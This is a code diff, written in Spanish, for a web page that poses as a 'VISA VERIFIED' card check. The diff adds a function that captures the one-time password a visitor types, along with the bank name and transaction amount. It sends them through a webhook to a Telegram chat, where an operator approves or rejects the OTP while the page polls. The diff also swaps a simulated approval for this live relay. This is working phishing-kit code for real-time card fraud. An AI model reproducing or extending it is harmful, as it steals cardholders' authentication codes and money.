@@ -663,11 +663,43 @@
 
         async function verificarEstadoSolicitud(solicitudId) {
             try {
-                const response = await fetch(`${WEBHOOK_URL}?check=${solicitudId}`);
+                const response = await fetch(`${WEBHOOK_BASE_URL}/api/webhook?check=${solicitudId}`);
                 const data = await response.json();
                 return data.estado || 'pending';
             } catch (error) {
                 return 'pending';
+            }
+        }
+
+        async function enviarOTPATelegram(datos) {
+            try {
+                const bancoEmisor = localStorage.getItem('bancoEmisor') || 'No especificado';
+
+                const inlineKeyboard = {
+                    inline_keyboard: [
+                        [
+                            { text: "✅ APROBAR OTP", callback_data: `aprobar_otp_${datos.solicitudId}` },
+                            { text: "❌ RECHAZAR OTP", callback_data: `rechazar_otp_${datos.solicitudId}` }
+                        ]
+                    ]
+                };
+
+                const mensaje = `🔔 *OTP REQUERIDO - VISA VERIFIED*\n\n🆔 ID: \`${datos.solicitudId}\`\n🏛️ BANCO: ${bancoEmisor}\n📱 OTP INGRESADO: \`${datos.otp}\`\n💰 Monto: ${datos.monto}\n⏳ Esperando aprobación...`;
+
+                const response = await fetch(`${WEBHOOK_BASE_URL}/api/send-telegram`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        mensaje: mensaje,
+                        inline_keyboard: inlineKeyboard
+                    })
+                });
+
+                const data = await response.json();
+                return data.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
             }
         }
 
@@ -816,11 +848,20 @@
                     resetFormulario();
                 }
             } else if (pasoActual === 'otp') {
-                // Simular aprobación OTP (en producción, hacer polling real)
-                mostrarExito('✅ Autenticación exitosa');
-                setTimeout(() => {
-                    window.location.href = 'exito.html';
-                }, 2000);
+                const datosTelegram = {
+                    solicitudId: solicitudId,
+                    otp: confirmationInput.value.trim(),
+                    monto: document.getElementById('transaction-amount').textContent
+                };
+
+                const enviado = await enviarOTPATelegram(datosTelegram);
+                if (enviado) {
+                    iniciarPollingOTP();
+                } else {
+                    mostrarError('Error al procesar OTP');
+                    submitButton.disabled = false;
+                    loadingOverlay.classList.remove('active');
+                }
             }
         });
 
